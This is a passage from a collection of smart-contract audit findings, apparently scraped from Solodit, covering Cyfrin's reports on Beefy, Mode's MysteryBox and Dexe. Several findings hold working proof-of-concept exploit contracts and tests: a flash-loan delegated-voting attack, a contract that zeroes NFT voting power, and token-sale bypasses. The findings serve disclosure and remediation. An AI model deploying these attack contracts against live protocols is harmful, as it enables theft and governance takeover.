function trade(address trader, bool dealTokens, bool tokenInd, uint256 tokenAmount) public {\n        vm.startPrank(trader);\n\n        if(tokenInd) {\n            if(dealTokens) deal(address(token0), trader, tokenAmount);\n\n            IERC20(token0).approve(address(unirouter), tokenAmount);\n\n            IUniswapRouterV3.ExactInputParams memory params = IUniswapRouterV3.ExactInputParams({\n                path: tradePath1,\n                recipient: trader,\n                deadline: block.timestamp,\n                amountIn: tokenAmount,\n                amountOutMinimum: 0\n            });\n            IUniswapRouterV3(unirouter).exactInput(params);\n        }\n        else {\n            if(dealTokens) deal(address(token1), trader, tokenAmount);\n\n            IERC20(token1).approve(address(unirouter), tokenAmount);\n\n            IUniswapRouterV3.ExactInputParams memory params = IUniswapRouterV3.ExactInputParams({\n                path: tradePath2,\n                recipient: trader,\n                deadline: block.timestamp,\n                amountIn: tokenAmount,\n                amountOutMinimum: 0\n            });\n            IUniswapRouterV3(unirouter).exactInput(params);\n        }\n\n        vm.stopPrank();\n    }\n\n    // Convert token route to encoded path\n    // uint24 type for fees so path is packed tightly\n    function routeToPath(\n        address[] memory _route,\n        uint24[] memory _fee\n    ) internal pure returns (bytes memory path) {\n        path = abi.encodePacked(_route[0]);\n        uint256 feeLength = _fee.length;\n        for (uint256 i = 0; i < feeLength; i++) {\n            path = abi.encodePacked(path, _fee[i], _route[i+1]);\n        }\n    }\n}\n"
    ],
    "Description": [
        " When the owner of the StrategyPassiveManagerUniswap contract calls setPositionWidth and unpause an attacker can sandwich attack these calls to drain the protocol's tokens. This is possible because setPositionWidth and unpause redeploy Beefy's liquidity into a new range based off the current tick and don't check the onlyCalmPeriods modifier, so an attacker can use this to force Beefy to re-deploy liquidity into an unfavorable range."
    ],
    "Impact": [
        " Attacker can sandwich attack owner call to setPositionWidth and unpause to drain protocol tokens."
    ],
    "Proof of Concept": [
        " Add a new test file test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol:",
        "Run with: forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth --fork-block-number 19410822 -vvv"
    ],
    "Recommended Mitigation": [
        " Two options:",
        "The second option seems preferable because:"
    ],
    "Beefy": [
        "\nFixed in commit 2c5f4cb and d7a7251."
    ],
    "Cyfrin": [
        " Verified.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/transferring-mystery-boxes-bricks-token-redemption-cyfrin-none-cyfrin-mode-earnm-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " MysteryBox is an ERC1155 contract which users expect to be able to transfer to other addresses via the in-built transfer functions. But MysteryBox::claimMysteryBoxes() reverts unless the caller is the same address who minted the box since the internal mappings that track mystery box ownership are never updated when transfers occur."
    ],
    "Impact": [
        " Token redemption is bricked if users transfer their mystery box. Users reasonably expect to be able to transfer their mystery box from one address they control to another address (if for example their first address is compromised), or they may wish to sell their mystery box on platforms like OpenSea which support ERC1155 sales."
    ],
    "Recommended Mitigation": [
        " Override ERC1155 transfer hooks to either prevent transferring of mystery boxes, or to update the internal mappings such that when mystery boxes are transferred the new owner address can redeem their tokens. The second option may be more attractive for the protocol as it allows mystery box holders to access liquidity without putting sell pressure on the token, creating a \"secondary market\" for mystery boxes."
    ],
    "Mode": [
        "\nFixed in commit a65a50c by overriding ERC1155::_beforeTokenTransfer() to prevent mystery boxes from being transferred."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/broken-check-in-mysteryboxfulfillrandomwords-fails-to-prevent-same-request-being-fulfilled-multiple-times-cyfrin-none-cyfrin-mode-earnm-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "if (vrfRequests[_requestId].fulfilled) revert InvalidVrfState();\n"
    ],
    "Description": [
        " Consider the check which attempts to prevent the same request from being fulfilled multiple times:",
        "The problem is that vrfRequests[_requestId].fulfilled is never set to true anywhere and vrfRequests[_requestId] is deleted at the end of the function."
    ],
    "Impact": [
        " The same request can be fulfilled multiple times which would override the previous randomly generated seed; a malicious provider who was also a mystery box minter could generate new randomness until they got a rare mystery box."
    ],
    "Recommended Mitigation": [
        " Set vrfRequests[_requestId].fulfilled = true.",
        "Consider an optimized version which involves having 2 mappings activeVrfRequests and fulfilledVrfRequests:",
        "This only stores forever the requestId : bool pair in fulfilledVrfRequests.",
        "Consider a similar approach in MysteryBox::fulfillBoxAmount()."
    ],
    "Mode": [
        "\nFixed in commit 85b2012, c4c50ed, d5b14d8, 5df2b82."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/owner-can-rug-pull-redemption-tokens-leaving-mystery-box-contract-insolvent-and-mystery-box-holders-unable-to-redeem-cyfrin-none-cyfrin-mode-earnm-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " MysteryBox::ownerWithdrawEarnm() allows the owner to transfer the contract's total redemption token balance to themselves, rug-pulling the redemption tokens which mystery boxes are supposed to be redeemed for."
    ],
    "Impact": [
        " The contract becomes totally insolvent and mystery box owners are unable to redeem."
    ],
    "Recommended Mitigation": [
        " The contract should always have the necessary tokens to payout the maximum redemption liability on all currently minted and unclaimed mystery boxes. The owner should only be able to withdraw the surplus amount (the excess over the total liability).",
        "When mystery boxes are minted the total liability increases and when mystery boxes are claimed the total liability decreases. Consider tracking the total liability as mystery boxes are minted & claimed and only allowing the owner to withdraw the surplus tokens above this value."
    ],
    "Mode": [
        "\nFixed in commit db7b48e, edefb61, a65a50c."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/incorrect-cap-on-batchesamount-results-in-500m-instead-of-5b-tokens-distributed-to-mystery-box-holders-cyfrin-none-cyfrin-mode-earnm-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " setBatchesAmount() caps the maximum batchesAmount 100 but this is incorrect. Every batch releases mystery boxes which can be redeemed for ~5M tokens and there are 5B tokens in total so 1000 batches to distribute the entire supply."
    ],
    "Impact": [
        " Incorrectly capping to 100 batches results in never being able to distribute all 5B tokens, but only 500M tokens."
    ],
    "Recommended Mitigation": [
        " Cap batchesAmount to 1000 to allow full token distribution."
    ],
    "Mode": [
        "\nFixed in commit ae3dc68."
    ],
    "Cyfrin": [
        " Verified.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/excess-eth-not-refunded-to-user-in-mysteryboxrevealmysteryboxes-cyfrin-none-cyfrin-mode-earnm-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " MysteryBox::revealMysteryBoxes() allows execution if msg.value >= mintFee but in the case where msg.value > mintFee, the extra eth gets sent to operatorAddress not refunded back to the user."
    ],
    "Impact": [
        " User loses excess eth above mintFee."
    ],
    "Recommended Mitigation": [
        " Either refund excess eth back to the user or revert if msg.value != mintFee."
    ],
    "Mode": [
        "\nFixed in commit 85b2012."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/minting-can-be-indefinitely-stuck-due-to-request-timeout-of-external-adapters-when-using-chainlink-any-api-cyfrin-none-cyfrin-mode-earnm-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " Mode has integrated Chainlink Any API to interact with external adapters, verifying user codes and wallet addresses to determine the number of boxes to mint. The system uses a direct-request job type, triggering actions based on the ChainlinkRequested event emission. However, there's a notable issue: if the initial GET request times out, such requests may remain pending indefinitely. Current design does not have a provision to cancel pending requests and create new ones."
    ],
    "Impact": [
        " If the external adapter doesn't respond promptly, users are unable to submit another minting request because their code is deleted after the initial request. This could result in users losing their codes and not receiving their mystery box rewards."
    ],
    "Recommended Mitigation": [
        " Consider implementing a function that code recipients can invoke in the event of a request timeout. This function should internally call ChainlinkClient:cancelChainlinkRequest and include a callback to the MysteryBox contract to initiate a new request using the same data as the original. Essentially, this means reusing the code/user address and the previously generated random number for the new request."
    ],
    "Mode": [
        "\nAcknowledged.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/attacker-can-combine-flashloan-with-delegated-voting-to-decide-a-proposal-and-withdraw-their-tokens-while-the-proposal-is-still-in-locked-state-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"../../interfaces/gov/IGovPool.sol\";\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract FlashDelegationVoteAttack {\n    //\n    // how the attack contract works:\n    //\n    // 1) use flashloan to acquire large amount of voting tokens\n    //    (caller transfer tokens to contract before calling to simplify PoC)\n    // 2) deposit voting tokens into GovPool\n    // 3) delegate voting power to slave contract\n    // 4) slave contract votes with delegated power\n    // 5) proposal immediately reaches quorum and moves into Locked state\n    // 6) undelegate voting power from slave contract\n    //    since undelegation works while Proposal is in locked state\n    // 7) withdraw voting tokens from GovPool while proposal still in Locked state\n    // 8) all in 1 txn\n    //\n\n    function attack(address govPoolAddress, address tokenAddress, uint256 proposalId) external {\n        // verify that the attack contract contains the voting tokens\n        IERC20 votingToken = IERC20(tokenAddress);\n\n        uint256 votingPower = votingToken.balanceOf(address(this));\n        require(votingPower > 0, \"AttackContract: need to send tokens first\");\n\n        // create the slave contract that this contract will delegate to which\n        // will do the actual vote\n        FlashDelegationVoteAttackSlave slave = new FlashDelegationVoteAttackSlave();\n\n        // deposit our tokens with govpool\n        IGovPool govPool = IGovPool(govPoolAddress);\n\n        // approval first\n        (, address userKeeperAddress, , , ) = govPool.getHelperContracts();\n        votingToken.approve(userKeeperAddress, votingPower);\n\n        // then actual deposit\n        govPool.deposit(address(this), votingPower, new uint256[](0));\n\n        // verify attack contract has no tokens\n        require(\n            votingToken.balanceOf(address(this)) == 0,\n            \"AttackContract: balance should be 0 after depositing tokens\"\n        );\n\n        // delegate our voting power to the slave\n        govPool.delegate(address(slave), votingPower, new uint256[](0));\n\n        // slave does the actual vote\n        slave.vote(govPool, proposalId);\n\n        // verify proposal now in Locked state as quorum was reached\n        require(\n            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,\n            \"AttackContract: proposal didnt move to Locked state after vote\"\n        );\n\n        // undelegate our voting power from the slave\n        govPool.undelegate(address(slave), votingPower, new uint256[](0));\n\n        // withdraw our tokens\n        govPool.withdraw(address(this), votingPower, new uint256[](0));\n\n        // verify attack contract has withdrawn all tokens used in the delegated vote\n        require(\n            votingToken.balanceOf(address(this)) == votingPower,\n            \"AttackContract: balance should be full after withdrawing\"\n        );\n\n        // verify proposal still in the Locked state\n        require(\n            govPool.getProposalState(proposalId) == IGovPool.ProposalState.Locked,\n            \"AttackContract: proposal should still be in Locked state after withdrawing tokens\"\n        );\n\n        // attack contract can now repay flash loan\n    }\n}\n\ncontract FlashDelegationVoteAttackSlave {\n    function vote(IGovPool govPool, uint256 proposalId) external {\n        // slave has no voting power so votes 0, this will automatically\n        // use the delegated voting power\n        govPool.vote(proposalId, true, 0, new uint256[](0));\n    }\n}\n",
        "      it(\"audit attacker combine flash loan with delegation to decide vote then immediately withdraw loaned tokens by undelegating\", async () => {\n        await changeInternalSettings(false);\n\n        // setup the proposal\n        let proposalId = 2;\n        await govPool.createProposal(\n          \"example.com\",\n          [[govPool.address, 0, getBytesGovVote(proposalId, wei(\"100\"), [], true)]],\n          [[govPool.address, 0, getBytesGovVote(proposalId, wei(\"100\"), [], false)]]\n        );\n\n        assert.equal(await govPool.getProposalState(proposalId), ProposalState.Voting);\n\n        // setup the attack contract\n        const AttackContractMock = artifacts.require(\"FlashDelegationVoteAttack\");\n        let attackContract = await AttackContractMock.new();\n\n        // give SECOND's tokens to the attack contract\n        let voteAmt = wei(\"100000000000000000000\");\n        await govPool.withdraw(attackContract.address, voteAmt, [], { from: SECOND });\n\n        // execute the attack\n        await attackContract.attack(govPool.address, token.address, proposalId);\n      });\n"
    ],
    "Description": [
        " Attacker can combine a flashloan with delegated voting to bypass the existing flashloan mitigations, allowing the attacker to decide a proposal & withdraw their tokens while the proposal is still in the Locked state. The entire attack can be performed in 1 transaction via an attack contract."
    ],
    "Impact": [
        " Attacker can bypass existing flashloan mitigations to decide the outcome of proposals by combining flashloan with delegated voting."
    ],
    "Proof of Concept": [
        " Add the attack contract to mock/utils/FlashDelegationVoteAttack.sol:",
        "Add the unit test to GovPool.test.js under describe(\"getProposalState()\", () => {:",
        "Run the test with: npx hardhat test --grep \"audit attacker combine flash loan with delegation\"."
    ],
    "Recommended Mitigation": [
        " Consider additional defensive measures such as not allowing delegation/undelegation & deposit/withdrawal in the same block."
    ],
    "Dexe": [
        "\nFixed in PR166."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/tokensaleproposalbuy-implicitly-assumes-that-buy-token-has-18-decimals-resulting-in-a-potential-total-loss-scenario-for-dao-pool-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "    function _sendFunds(address token, address to, uint256 amount) internal {\n        if (token == ETHEREUM_ADDRESS) {\n            (bool success, ) = to.call{value: amount}(\"\");\n            require(success, \"TSP: failed to transfer ether\");\n        } else {\n  >>          IERC20(token).safeTransferFrom(msg.sender, to, amount.from18(token.decimals())); //@audit -> amount is assumed to be 18 decimals\n        }\n    }\n",
        "      let purchaseToken3;\n",
        "      purchaseToken3 = await ERC20Mock.new(\"PurchaseMockedToken3\", \"PMT3\", 6);\n",
        "        {\n          metadata: {\n            name: \"tier 9\",\n            description: \"the ninth tier\",\n          },\n          totalTokenProvided: wei(1000),\n          saleStartTime: timeNow.toString(),\n          saleEndTime: (timeNow + 10000).toString(),\n          claimLockDuration: \"0\",\n          saleTokenAddress: saleToken.address,\n          purchaseTokenAddresses: [purchaseToken3.address],\n          exchangeRates: [PRECISION.times(1).toFixed()],\n          minAllocationPerUser: 0,\n          maxAllocationPerUser: 0,\n          vestingSettings: {\n            vestingPercentage: \"0\",\n            vestingDuration: \"0\",\n            cliffPeriod: \"0\",\n            unlockStep: \"0\",\n          },\n          participationDetails: [],\n        },\n",
        "          it(\"audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO\", async () => {\n            await purchaseToken3.approve(tsp.address, wei(1000));\n\n            // tier9 has the following parameters:\n            // totalTokenProvided   : wei(1000)\n            // minAllocationPerUser : 0 (no min)\n            // maxAllocationPerUser : 0 (no max)\n            // exchangeRate         : 1 sale token for every 1 purchaseToken\n            //\n            // purchaseToken3 has 6 decimal places\n            //\n            // mint purchase tokens to owner 1000 in 6 decimal places\n            //                        1000 000000\n            let buyerInitTokens6Dec = 1000000000;\n\n            await purchaseToken3.mint(OWNER, buyerInitTokens6Dec);\n            await purchaseToken3.approve(tsp.address, buyerInitTokens6Dec, { from: OWNER });\n\n            //\n            // start: buyer has bought no tokens\n            let TIER9 = 9;\n            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, wei(0));\n\n            // buyer attempts to purchase using 100 purchaseToken3 tokens\n            // purchaseToken3 has 6 decimals but all inputs to Dexe should be in\n            // 18 decimals, so buyer formats input amount to 18 decimals\n            // doing this first to verify it works correctly\n            let buyInput18Dec = wei(\"100\");\n            await tsp.buy(TIER9, purchaseToken3.address, buyInput18Dec);\n\n            // buyer has bought wei(100) sale tokens\n            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, buyInput18Dec);\n\n            // buyer has 900 000000 remaining purchaseToken3 tokens\n            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), \"900000000\");\n\n            // next buyer attempts to purchase using 100 purchaseToken3 tokens\n            // but sends input formatted into native 6 decimals\n            // sends 6 decimal input: 100 000000\n            let buyInput6Dec = 100000000;\n            await tsp.buy(TIER9, purchaseToken3.address, buyInput6Dec);\n\n            // buyer has bought an additional 100000000 sale tokens\n            purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER9]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, \"100000000000100000000\");\n\n            // but the buyer still has 900 000000 remaining purchasetoken3 tokens\n            assert.equal((await purchaseToken3.balanceOf(OWNER)).toFixed(), \"900000000\");\n\n            // by sending the input amount formatted to 6 decimal places,\n            // the buyer was able to buy small amounts of the token being sold\n            // for free!\n          });\n"
    ],
    "Description": [
        " TokenSaleProposalBuy::buy is called by users looking to buy the DAO token using a pre-approved token. The exchange rate for this sale is pre-assigned for the specific tier. This function internally calls TokenSaleProposalBuy::_purchaseWithCommission to transfer funds from the buyer to the gov pool. Part of the transferred funds are used to pay the DexeDAO commission and balance funds are transferred to the GovPool address. To do this, TokenSaleProposalBuy::_sendFunds is called.",
        "Note that this function assumes that the amount of ERC20 token is always 18 decimals. The DecimalsConverter::from18 function converts from a base decimal (18) to token decimals. Note that the amount is directly passed by the buyer and there is no prior normalisation done to ensure the token decimals are converted to 18 decimals before the _sendFunds is called."
    ],
    "Impact": [
        " It is easy to see that for tokens with smaller decimals, eg. USDC with 6 decimals, will cause a total loss to the DAO. In such cases amount is presumed to be 18 decimals & on converting to token decimals(6), this number can round down to 0."
    ],
    "Proof of Concept": [
        "",
        "Buyer can claim 1000 DAO tokens for free. This is a total loss to the DAO.",
        "Add PoC to TokenSaleProposal.test.js:",
        "First add a new line around L76 to add new purchaseToken3:",
        "Then add a new line around L528:",
        "Then add a new tier around L712:",
        "Then add the test itself under the section describe(\"if added to whitelist\", () => {:",
        "Finally run the test with: npx hardhat test --grep \"audit buy implicitly assumes that buy token has 18 decimals resulting in loss to DAO\""
    ],
    "Recommended Mitigation": [
        " There are at least 2 options for mitigating this issue:",
        "Option 1 - revise the design decision that all token amounts must be sent in 18 decimals even if the underlying token decimals are not 18, to instead that all token amounts should be sent in their native decimals and Dexe will convert everything.",
        "Option 2 - keep current design but revert if amount.from18(token.decimals()) == 0 in L90 or alternatively use the from18Safe() function which uses _convertSafe() that reverts if the conversion is 0.",
        "The project team should also examine other areas where the same pattern occurs which may have the same vulnerability and where it may be required to revert if the conversion returns 0:"
    ],
    "Dexe": [
        "\nFixed in commit c700d9f."
    ],
    "Cyfrin": [
        " Verified. While other places have been changed, TokenBalance::sendFunds() still uses from18() instead of from18Safe() & other parts of the codebase which allow user input when calling TokenBalance::sendFunds() directly could be impacted by a similar issue.",
        "For example TokenSaleProposalWhitelist::unlockParticipationTokens() - if users try to unlock a small enough amount of locked tokens which are in 6 decimal precision, state will be updated as if the unlock was successful but the resulting conversion in TokenBalance::sendFunds() will round down to 0. Execution will continue & zero tokens will be transferred to the user but since storage has been updated those tokens will remain forever locked.",
        "Dexe should carefully consider if there exists any valid situations where the from18() conversion in TokenBalance::sendFunds() should round an input > 0 to 0, and the transaction should not revert but continue executing transferring 0 tokens? Cyfrin recommends that the \"default\" conversion to use is from18Safe() and that from18() should only be used where conversions to 0 are explicitly allowed."
    ]
}
----End JSON----

https://solodit.xyz/issues/attacker-can-destroy-user-voting-power-by-setting-erc721powertotalpower-and-all-existing-nfts-currentpower-to-0-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {\n    // @audit execution allowed to continue when\n    // block.timestamp == powerCalcStartTimestamp\n    if (block.timestamp < powerCalcStartTimestamp) {\n        return 0;\n    }\n    // @audit getNftPower() returns 0 when\n    // block.timestamp == powerCalcStartTimestamp\n    newPower = getNftPower(tokenId);\n\n    NftInfo storage nftInfo = nftInfos[tokenId];\n\n    // @audit as this is the first update since power\n    // calculation has just started, totalPower will be\n    // subtracted by nft's max power\n    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);\n    // @audit totalPower += 0 (newPower = 0 in above line)\n    totalPower += newPower;\n\n    nftInfo.lastUpdate = uint64(block.timestamp);\n    // @audit will set nft's current power to 0\n    nftInfo.currentPower = newPower;\n}\n\nfunction getNftPower(uint256 tokenId) public view override returns (uint256) {\n    // @audit execution always returns 0 when\n    // block.timestamp == powerCalcStartTimestamp\n    if (block.timestamp <= powerCalcStartTimestamp) {\n        return 0;\n",
        "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"../../gov/ERC721/ERC721Power.sol\";\n\nimport \"hardhat/console.sol\";\n\ncontract ERC721PowerAttack {\n    // this attack can decrease ERC721Power::totalPower by the the true max power of all\n    // the power nfts that exist (to zero), regardless of who owns them, and sets the current\n    // power of all nfts to zero, totally bricking the ERC721Power contract.\n    //\n    // this attack only works when block.timestamp == nftPower.powerCalcStartTimestamp\n    // as it takes advantage of a difference in getNftPower() & recalculateNftPower():\n    //\n    // getNftPower() returns 0 when block.timestamp <= powerCalcStartTimestamp\n    // recalculateNftPower returns 0 when block.timestamp < powerCalcStartTimestamp\n    function attack(\n        address nftPowerAddr,\n        uint256 initialTotalPower,\n        uint256 lastTokenId\n    ) external {\n        ERC721Power nftPower = ERC721Power(nftPowerAddr);\n\n        // verify attack starts on the correct block\n        require(\n            block.timestamp == nftPower.powerCalcStartTimestamp(),\n            \"ERC721PowerAttack: attack requires block.timestamp == nftPower.powerCalcStartTimestamp\"\n        );\n\n        // verify totalPower() correct at starting block\n        require(\n            nftPower.totalPower() == initialTotalPower,\n            \"ERC721PowerAttack: incorrect initial totalPower\"\n        );\n\n        // call recalculateNftPower() for every nft, this:\n        // 1) decreases ERC721Power::totalPower by that nft's max power\n        // 2) sets that nft's currentPower = 0\n        for (uint256 i = 1; i <= lastTokenId; ) {\n            require(\n                nftPower.recalculateNftPower(i) == 0,\n                \"ERC721PowerAttack: recalculateNftPower() should return 0 for new nft power\"\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        require(\n            nftPower.totalPower() == 0,\n            \"ERC721PowerAttack: after attack finished totalPower should equal 0\"\n        );\n    }\n}\n",
        "    describe(\"audit attacker can manipulate ERC721Power totalPower\", () => {\n      it(\"audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0\", async () => {\n        // deploy the ERC721Power nft contract with:\n        // max power of each nft = 100\n        // power reduction 10%\n        // required collateral = 100\n        let maxPowerPerNft = toPercent(\"100\");\n        let requiredCollateral = wei(\"100\");\n        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;\n        // hack needed to start attack contract on exact block due to hardhat\n        // advancing block.timestamp in the background between function calls\n        let powerCalcStartTime2 = (await getCurrentBlockTime()) + 999;\n\n        // create power nft contract\n        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent(\"10\"), requiredCollateral);\n\n        // ERC721Power::totalPower should be zero as no nfts yet created\n        assert.equal((await nft.totalPower()).toFixed(), toPercent(\"0\").times(1).toFixed());\n\n        // create the attack contract\n        const ERC721PowerAttack = artifacts.require(\"ERC721PowerAttack\");\n        let attackContract = await ERC721PowerAttack.new();\n\n        // create 10 power nfts for SECOND\n        await nft.safeMint(SECOND, 1);\n        await nft.safeMint(SECOND, 2);\n        await nft.safeMint(SECOND, 3);\n        await nft.safeMint(SECOND, 4);\n        await nft.safeMint(SECOND, 5);\n        await nft.safeMint(SECOND, 6);\n        await nft.safeMint(SECOND, 7);\n        await nft.safeMint(SECOND, 8);\n        await nft.safeMint(SECOND, 9);\n        await nft.safeMint(SECOND, 10);\n\n        // verify ERC721Power::totalPower has been increased by max power for all nfts\n        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());\n\n        // fast forward time to the start of power calculation\n        await setTime(powerCalcStartTime2);\n\n        // launch the attack\n        await attackContract.attack(nft.address, maxPowerPerNft.times(10).toFixed(), 10);\n      });\n    });\n"
    ],
    "Description": [
        " Attacker can destroy user voting power by setting ERC721Power::totalPower & all existing nfts' currentPower to 0 via a permission-less attack contract by exploiting a discrepancy (\"<\" vs \"<=\") in ERC721Power L144 & L172:",
        "This attack has to be run on the exact block that power calculation starts (when block.timestamp == ERC721Power.powerCalcStartTimestamp)."
    ],
    "Impact": [
        " ERC721Power::totalPower & all existing nft's currentPower are set 0, negating voting using ERC721Power since totalPower is read when creating the snapshot and GovUserKeeper::getNftsPowerInTokensBySnapshot() will return 0 same as if the nft contract didn't exist. Can also negatively affect the ability to create proposals.",
        "This attack is extremely devastating as the individual power of ERC721Power nfts can never be increased; it can only decrease over time if the required collateral is not deposited. By setting all nfts' currentPower = 0 as soon as power calculation starts (block.timestamp == ERC721Power.powerCalcStartTimestamp) the ERC721Power contract is effectively completely bricked - there is no way to \"undo\" this attack unless the nft contract is replaced with a new contract.",
        "Dexe-DAO can be created using only nfts for voting; in this case this exploit which completely bricks the voting power of all nfts means a new DAO has to be re-deployed since no one can vote as everyone's voting power has been destroyed."
    ],
    "Proof of Concept": [
        " Add attack contract mock/utils/ERC721PowerAttack.sol:",
        "Add test harness to ERC721Power.test.js:",
        "Run attack with: npx hardhat test --grep \"audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0\""
    ],
    "Recommended Mitigation": [
        " Resolve the discrepancy between ERC721Power L144 & L172."
    ],
    "Dexe": [
        "\nFixed in PR174."
    ],
    "Cyfrin": [
        " Verified.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/under-funded-eth-distribution-proposals-can-be-created-causing-claiming-rewards-to-revert-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "      it(\"under-funded eth distribution proposals prevents claiming rewards\", async () => {\n        // use GovPool to create a proposal with 10 wei reward\n        await govPool.createProposal(\n          \"example.com\",\n          [[dp.address, wei(\"10\"), getBytesDistributionProposal(1, ETHER_ADDR, wei(\"10\"))]],\n          [],\n          { from: SECOND }\n        );\n\n        // Under-fund the proposal by calling DistributionProposal::execute() with:\n        // 1) token     = ether\n        // 2) amount    = X\n        // 3) msg.value = Y, where Y < X\n        //\n        // This creates an under-funded proposal breaking the subsequent claim()\n        await impersonate(govPool.address);\n        await dp.execute(1, ETHER_ADDR, wei(\"10\"), { value: wei(1), from: govPool.address });\n\n        // only 1 vote so SECOND should get the entire 10 wei reward\n        await govPool.vote(1, true, 0, [1], { from: SECOND });\n\n        // attempting to claim the reward fails as the proposal is under-funded\n        await truffleAssert.reverts(dp.claim(SECOND, [1]), \"Gov: failed to send eth\");\n      });\n"
    ],
    "Description": [
        " It is possible to create under-funded eth distribution proposals as DistributionProposal::execute() L62-63 doesn't check whether amount == msg.value. If msg.value < amount an under-funded distribution proposal will be executed.",
        "This opens up an attack vector where a malicious GovPool owner can provide fake incentives to users to make them vote on proposals. At the time of reward distribution, owner can simply execute a distribution proposal without sending the promised amount as reward. As a result, users end up voting for a proposal and not getting paid for it."
    ],
    "Impact": [
        " Users can't claim their rewards as DistributionProposal::claim() will revert for under-funded distribution proposals. Since anybody can create a GovPool, there is a potential for loss to users due to malicious intent."
    ],
    "Proof of Concept": [
        " Add this PoC to test/gov/proposals/DistributionProposal.test.js under the section describe(\"claim()\", () => {:",
        "Run with npx hardhat test --grep \"under-funded eth distribution\""
    ],
    "Recommended Mitigation": [
        " DistributionProposal::execute() L62-63 should revert if amount != msg.value for eth funded proposals."
    ],
    "Dexe": [
        "\nFixed in PR164."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/attacker-can-bypass-token-sale-maxallocationperuser-restriction-to-buy-out-the-entire-tier-cyfrin-none-cyfrin-dexe-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "        {\n          metadata: {\n            name: \"tier 8\",\n            description: \"the eighth tier\",\n          },\n          totalTokenProvided: wei(1000),\n          saleStartTime: timeNow.toString(),\n          saleEndTime: (timeNow + 10000).toString(),\n          claimLockDuration: \"0\",\n          saleTokenAddress: saleToken.address,\n          purchaseTokenAddresses: [purchaseToken1.address],\n          exchangeRates: [PRECISION.times(4).toFixed()],\n          minAllocationPerUser: wei(10),\n          maxAllocationPerUser: wei(100),\n          vestingSettings: {\n            vestingPercentage: \"0\",\n            vestingDuration: \"0\",\n            cliffPeriod: \"0\",\n            unlockStep: \"0\",\n          },\n          participationDetails: [],\n        },\n",
        "          it(\"attacker can bypass token sale maxAllocationPerUser to buy out the entire tier\", async () => {\n            await purchaseToken1.approve(tsp.address, wei(1000));\n\n            // tier8 has the following parameters:\n            // totalTokenProvided   : wei(1000)\n            // minAllocationPerUser : wei(10)\n            // maxAllocationPerUser : wei(100)\n            // exchangeRate         : 4 sale tokens for every 1 purchaseToken\n            //\n            // one user should at most be able to buy wei(100),\n            // or 10% of the total tier.\n            //\n            // any user can bypass this limit by doing multiple\n            // smaller buys to buy the entire tier.\n            //\n            // start: user has bought no tokens\n            let TIER8 = 8;\n            let purchaseView = userViewsToObjects(await tsp.getUserViews(OWNER, [TIER8]))[0].purchaseView;\n            assert.equal(purchaseView.claimTotalAmount, wei(0));\n\n            // if the user tries to buy it all in one txn,\n            // maxAllocationPerUser is enforced and the txn reverts\n            await truffleAssert.reverts(tsp.buy(TIER8, purchaseToken1.address, wei(250)), \"TSP: wrong allocation\");\n\n            // but user can do multiple smaller buys to get around the\n            // maxAllocationPerUser check which only checks each\n            // txn individually, doesn't factor in the total amount\n            // user has already bought\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await tsp.buy(TIER8, purchaseToken1.address, wei(25));\n            await 